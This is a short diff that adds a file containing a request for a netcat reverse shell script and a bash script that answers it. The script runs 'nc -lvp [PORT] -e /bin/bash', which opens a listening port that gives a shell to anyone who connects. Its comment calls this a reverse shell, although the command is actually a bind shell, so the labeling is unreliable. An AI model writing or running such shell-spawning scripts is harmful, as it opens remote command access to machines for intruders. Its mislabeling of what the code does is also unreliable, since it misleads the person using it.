@@ -1,0 +1,7 @@
+morb asked write a bash script that creates a netcat reverse shell that uses tcp with hash 619ddd1a
+<---- snip ---->
+#!/bin/bash
+
+# This script creates a netcat reverse shell that uses tcp
+
+nc -lvp [PORT] -e /bin/bash
